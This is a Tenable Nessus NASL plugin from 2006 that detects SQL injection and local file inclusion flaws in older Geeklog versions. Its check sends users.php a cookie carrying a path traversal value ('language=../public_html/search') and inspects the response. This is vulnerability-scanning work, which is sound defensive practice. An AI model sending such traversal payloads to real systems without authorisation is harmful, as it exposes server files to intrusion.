#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote host is running Geeklog, an open-source weblog powered by
PHP and MySQL. 

The installed version of Geeklog suffers from a number of SQL
injection and local file flaws due to a failure of the application to
sanitize user-supplied input. 

See also :

http://www.gulftech.org/?node=research&article_id=00102-02192006
http://www.geeklog.net/article.php/geeklog-1.4.0sr1

Solution :

Upgrade to Geeklog version 1.3.11sr4 / 1.4.0sr1 or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20959);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0823", "CVE-2006-0824");
  script_bugtraq_id(16755);
  if (defined_func("script_xref"))
  {
    script_xref(name:"OSVDB", value:"23348");
    script_xref(name:"OSVDB", value:"23349");
  }

  script_name(english:"Geeklog < 1.3.11sr4 / 1.4.0sr1 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in Geeklog < 1.3.11sr4 / 1.4.0sr1");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/geeklog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to access a PHP file included with Geeklog.
  file = "../public_html/search";
  req = http_get(item:string(dir, "/users.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: language=", file, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If the output looks like it came from search.php...
  if (
    '<select name="keyType">' >< res &&
    '<option value="phrase">' >< res
  ) {
    # There's definitely a problem if we see two HTML documents.
    marker = "<!DOCTYPE HTML PUBLIC";
    page1 = strstr(res, marker);
    if (page1) page2 = page1 - marker;
    if (page2) page2 = strstr(page2, marker);
    if (page2) {
      security_warning(port);
      exit(0);
    }
  }
}
